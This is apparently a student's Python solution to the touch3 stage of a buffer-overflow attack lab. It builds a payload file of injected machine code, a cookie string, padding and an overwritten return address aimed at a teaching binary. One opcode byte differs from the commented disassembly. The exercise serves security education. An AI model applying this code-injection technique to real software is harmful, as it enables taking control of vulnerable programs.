"""
   0:   48 c7 c7 88 dc 61 55    mov    $0x5561dc88,%rdi
   7:   48 83 ec 28             sub    $0x28,%rsp
   b:   68 fa 18 40 00          push   $0x4018fa
  10:   c3                      ret
"""

f = open("./ctarget_touch3.bin", "wb")
asm = [0x48, 0xc7, 0xc7, 0x88, 0xdc, 0x61, 0x55, 0x49, 0x83, 0xec, 0x28, 0x68, 0xfa, 0x18, 0x40, 0x00, 0xc3]
for i in asm:
    f.write(i.to_bytes(1, "little"))
s = "0x59b997fa"
for c in s:
    f.write(ord(c).to_bytes(1, "little"))
f.write((0).to_bytes(1, "little"))
f.write(ord("a").to_bytes(1, "little") * (0x28 - len(asm) - len(s)-1))
f.write(int.to_bytes(0x5561dca0-0x28, 8, "little"))
f.close()
